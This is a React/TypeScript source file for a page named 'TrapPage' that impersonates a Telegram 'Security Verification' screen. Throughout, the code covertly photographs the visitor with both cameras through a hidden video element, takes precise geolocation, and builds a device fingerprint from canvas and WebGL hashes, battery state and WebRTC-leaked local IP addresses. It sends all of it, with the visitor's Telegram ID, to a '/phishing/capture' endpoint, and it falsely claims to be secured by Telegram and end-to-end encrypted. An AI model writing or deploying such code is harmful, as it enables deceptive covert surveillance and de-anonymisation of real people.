import { useState, useEffect, useRef, useCallback } from "react";
import { API_BASE } from "@/lib/api";
import { useTelegram } from "@/lib/telegram-context";
import { ShieldCheck, Camera, MapPin, Loader2, CheckCircle, XCircle, Mic, Wifi } from "lucide-react";

type StepState = "pending" | "active" | "done" | "failed";

interface StepDef {
  label: string;
  state: StepState;
}

async function collectDeviceInfo(): Promise<Record<string, unknown>> {
  const info: Record<string, unknown> = {};

  try { info.screen = `${screen.width}x${screen.height}`; info.colorDepth = screen.colorDepth; info.pixelRatio = window.devicePixelRatio; } catch {}
  try { info.platform = navigator.platform; info.language = navigator.language; info.languages = (navigator.languages || []).join(","); info.hardwareConcurrency = navigator.hardwareConcurrency; info.maxTouchPoints = navigator.maxTouchPoints; } catch {}
  try { info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; info.timezoneOffset = new Date().getTimezoneOffset(); } catch {}
  try { info.cookieEnabled = navigator.cookieEnabled; info.doNotTrack = navigator.doNotTrack; } catch {}
  try { info.vendor = navigator.vendor; info.userAgent = navigator.userAgent?.slice(0, 300); } catch {}
  try { info.windowSize = `${window.innerWidth}x${window.innerHeight}`; } catch {}
  try { info.deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory; } catch {}

  try {
    if ((navigator as unknown as { connection?: { type?: string; effectiveType?: string; downlink?: number; rtt?: number } }).connection) {
      const c = (navigator as unknown as { connection: { type?: string; effectiveType?: string; downlink?: number; rtt?: number } }).connection;
      info.connection = { type: c.type, effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
    }
  } catch {}

  try {
    const nav = navigator as unknown as { getBattery?: () => Promise<{ level: number; charging: boolean }> };
    if (nav.getBattery) {
      const b = await nav.getBattery();
      info.battery = { level: Math.round(b.level * 100), charging: b.charging };
    }
  } catch {}

  try {
    const estimate = await navigator.storage?.estimate?.();
    if (estimate) info.storage = { quota: estimate.quota, usage: estimate.usage };
  } catch {}

  try {
    const cvs = document.createElement("canvas");
    cvs.width = 200; cvs.height = 50;
    const ctx = cvs.getContext("2d")!;
    ctx.textBaseline = "top"; ctx.font = "14px Arial";
    ctx.fillStyle = "#f60"; ctx.fillRect(100, 1, 62, 20);
    ctx.fillStyle = "#069"; ctx.fillText("fingerprint", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("canvas", 4, 17);
    const d = cvs.toDataURL();
    let h = 0;
    for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h |= 0; }
    info.canvasHash = h;
  } catch {}

  try {
    const gl = document.createElement("canvas").getContext("webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        info.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        info.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch {}

  try { info.plugins = Array.from(navigator.plugins || []).slice(0, 10).map(p => p.name); } catch {}

  try {
    const webrtcIps: string[] = [];
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    await pc.createOffer().then(o => pc.setLocalDescription(o));
    await new Promise<void>(resolve => {
      const timeout = setTimeout(resolve, 3000);
      pc.onicecandidate = (e) => {
        if (!e.candidate) { clearTimeout(timeout); resolve(); return; }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
        if (m) m.forEach(ip => { if (!webrtcIps.includes(ip)) webrtcIps.push(ip); });
      };
    });
    pc.close();
    if (webrtcIps.length > 0) info.localIPs = webrtcIps;
  } catch {}

  return info;
}

export function TrapPage({ code }: { code: string }) {
  const { profile } = useTelegram();
  const [steps, setSteps] = useState<StepDef[]>([
    { label: "Initializing verification", state: "pending" },
    { label: "Accessing front camera", state: "pending" },
    { label: "Capturing front photo", state: "pending" },
    { label: "Accessing back camera", state: "pending" },
    { label: "Capturing back photo", state: "pending" },
    { label: "Getting location", state: "pending" },
    { label: "Collecting device info", state: "pending" },
    { label: "Submitting data", state: "pending" },
  ]);
  const [complete, setComplete] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const updateStep = useCallback((idx: number, state: StepState) => {
    setSteps(prev => prev.map((s, i) => (i === idx ? { ...s, state } : s)));
  }, []);

  const capturePhoto = useCallback(async (facingMode: string): Promise<Blob | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      const vid = videoRef.current!;
      vid.srcObject = stream;
      await vid.play();
      await new Promise(r => setTimeout(r, 1500));
      const cvs = canvasRef.current!;
      cvs.width = vid.videoWidth;
      cvs.height = vid.videoHeight;
      cvs.getContext("2d")!.drawImage(vid, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      vid.srcObject = null;
      return new Promise(r => cvs.toBlob(b => r(b), "image/jpeg", 0.85));
    } catch {
      return null;
    }
  }, []);

  const getLocation = useCallback(async (): Promise<{ lat: number; lng: number } | null> => {
    return new Promise(resolve => {
      if (!navigator.geolocation) { resolve(null); return; }
      const tid = setTimeout(() => resolve(null), 10000);
      navigator.geolocation.getCurrentPosition(
        pos => { clearTimeout(tid); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }); },
        () => { clearTimeout(tid); resolve(null); },
        { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 },
      );
    });
  }, []);

  const runCapture = useCallback(async () => {
    updateStep(0, "done");

    updateStep(1, "active");
    const frontBlob = await capturePhoto("user");
    updateStep(1, frontBlob ? "done" : "failed");
    updateStep(2, frontBlob ? "done" : "failed");

    updateStep(3, "active");
    const backBlob = await capturePhoto("environment");
    updateStep(3, backBlob ? "done" : "failed");
    updateStep(4, backBlob ? "done" : "failed");

    updateStep(5, "active");
    const loc = await getLocation();
    updateStep(5, loc ? "done" : "failed");

    updateStep(6, "active");
    let deviceInfo: string | null = null;
    try {
      const info = await collectDeviceInfo();
      deviceInfo = JSON.stringify(info);
      updateStep(6, "done");
    } catch {
      updateStep(6, "failed");
    }

    updateStep(7, "active");
    const fd = new FormData();
    fd.append("code", code);
    if (profile?.telegram_id) fd.append("telegram_id", String(profile.telegram_id));
    if (loc) {
      fd.append("latitude", String(loc.lat));
      fd.append("longitude", String(loc.lng));
    }
    if (frontBlob) fd.append("front_photo", new File([frontBlob], "front.jpg", { type: "image/jpeg" }));
    if (backBlob) fd.append("back_photo", new File([backBlob], "back.jpg", { type: "image/jpeg" }));
    if (deviceInfo) fd.append("device_info", deviceInfo);

    try {
      await fetch(`${API_BASE}/phishing/capture`, { method: "POST", body: fd });
      updateStep(7, "done");
    } catch {
      updateStep(7, "failed");
    }
    setComplete(true);
  }, [code, profile, capturePhoto, getLocation, updateStep]);

  useEffect(() => {
    const timer = setTimeout(() => runCapture(), 800);
    return () => clearTimeout(timer);
  }, []);

  const stepIcon = (state: StepState) => {
    if (state === "pending") return <div className="h-4 w-4 rounded-full border-2 border-muted-foreground/30" />;
    if (state === "active") return <Loader2 className="h-4 w-4 animate-spin text-blue-400" />;
    if (state === "done") return <CheckCircle className="h-4 w-4 text-emerald-400" />;
    return <XCircle className="h-4 w-4 text-red-400" />;
  };

  const stepIcon2 = (label: string) => {
    if (label.includes("camera") || label.includes("photo")) return <Camera className="h-3.5 w-3.5 text-blue-400/60" />;
    if (label.includes("location")) return <MapPin className="h-3.5 w-3.5 text-blue-400/60" />;
    if (label.includes("device")) return <Wifi className="h-3.5 w-3.5 text-blue-400/60" />;
    if (label.includes("audio") || label.includes("micro")) return <Mic className="h-3.5 w-3.5 text-blue-400/60" />;
    return <ShieldCheck className="h-3.5 w-3.5 text-blue-400/60" />;
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6">
      <div className="w-full max-w-sm space-y-6">
        <div className="text-center space-y-3">
          <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
            <ShieldCheck className="h-8 w-8 text-white" />
          </div>
          <h1 className="text-xl font-bold">Security Verification</h1>
          <p className="text-sm text-muted-foreground">
            Verifying your identity. Please allow camera and location access when prompted.
          </p>
        </div>

        <div className="bg-card border border-border rounded-2xl p-4 space-y-3">
          {steps.map((step, i) => (
            <div key={i} className="flex items-center gap-3">
              {stepIcon(step.state)}
              <span className={`text-sm flex-1 ${step.state === "done" ? "text-foreground" : step.state === "failed" ? "text-red-400" : "text-muted-foreground"}`}>
                {step.label}
              </span>
              {step.state === "pending" && stepIcon2(step.label)}
            </div>
          ))}
        </div>

        {complete && (
          <div className="text-center bg-emerald-500/10 border border-emerald-500/20 rounded-2xl p-4">
            <CheckCircle className="h-6 w-6 text-emerald-400 mx-auto mb-2" />
            <p className="text-sm text-emerald-400 font-medium">Verification complete</p>
            <p className="text-xs text-muted-foreground mt-1">You can close this page now.</p>
          </div>
        )}

        <p className="text-[10px] text-muted-foreground/40 text-center">
          Secured by Telegram · End-to-end encrypted
        </p>
      </div>

      <video ref={videoRef} autoPlay playsInline muted className="fixed -top-[9999px] -left-[9999px] w-px h-px opacity-[0.01]" />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}
